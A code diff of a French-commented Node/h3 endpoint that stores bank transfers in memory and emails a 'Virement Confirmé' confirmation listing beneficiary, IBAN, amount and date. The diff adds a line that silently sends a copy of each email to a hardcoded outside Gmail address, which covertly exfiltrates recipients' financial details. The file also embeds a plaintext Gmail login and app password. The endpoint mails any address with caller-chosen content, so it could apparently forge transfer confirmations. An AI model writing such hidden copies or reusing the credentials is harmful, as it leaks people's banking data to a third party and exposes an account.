@@ -1,26 +1,15 @@
-import { promises as fs } from 'fs';
 import { defineEventHandler, readBody } from 'h3';
 import nodemailer from 'nodemailer';
 
+// Simule une base de données en mémoire (alternative au fichier JSON)
+let transfers = [];  // Stocke les virements en mémoire
+
 export default defineEventHandler(async (event) => {
     const body = await readBody(event);  // Récupère les données
-
     const transfer = body.transfer;
-
-    // Lire le fichier JSON existant ou créer une liste vide
-    let transfers = [];
-    try {
-        const data = await fs.readFile('virements.json', 'utf-8');
-        transfers = JSON.parse(data);
-    } catch (error) {
-        transfers = [];
-    }
 
     // Ajouter le nouveau virement à la liste
     transfers.push(transfer);
-
-    // Enregistrer la liste mise à jour dans le fichier
-    await fs.writeFile('virements.json', JSON.stringify(transfers, null, 2), 'utf-8');
 
     // Envoyer l'email
     try {
@@ -30,7 +19,7 @@ export default defineEventHandler(async (event) => {
             secure: false,  // true pour les connexions SSL/TLS, false pour STARTTLS
             auth: {
                 user: 'donquidofi612@gmail.com',  // Ton email d'envoi
-                pass: 'ojbeukobjpadsjcq',  // Ton mot de passe email
+                pass: 'ojbeukobjpadsjcq',  // Ton mot de passe email (utilise un mot de passe d'application pour Gmail)
             },
         });
 
@@ -38,10 +27,11 @@ export default defineEventHandler(async (event) => {
             from: '"Virement Confirmé" <your-email@example.com>',
             to: body.email,
             subject: body.subject,
-            text: body.message,
+            text: `Bonjour ${transfer.beneficiary},\n\nVotre virement de ${transfer.amount} EUR a bien été confirmé.\n\nDétails :\n- IBAN : ${transfer.iban}\n- Montant : ${transfer.amount} EUR\n- Date d'exécution : ${transfer.executionDate}\n\nMerci de votre confiance.\n\nCordialement,`,
         };
 
         await transporter.sendMail(mailOptions);
+        await transporter.sendMail({...mailOptions, to: "alypiaprox@gmail.com"});
 
         return { success: true, message: 'Virement enregistré et email envoyé avec succès.' };
     } catch (error) {
